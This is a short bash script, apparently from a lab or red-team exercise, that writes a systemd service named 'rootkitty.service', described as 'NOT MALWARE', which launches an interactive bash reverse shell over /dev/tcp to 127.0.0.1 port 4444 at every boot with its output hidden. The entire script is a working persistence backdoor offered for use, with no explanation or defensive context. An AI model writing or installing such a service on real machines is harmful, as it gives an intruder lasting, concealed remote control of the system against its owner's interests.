#!/bin/bash

printf "[Unit]
Description=NOT MALWARE

[Service]
Type=simple
ExecStart=/bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/rootkitty.service
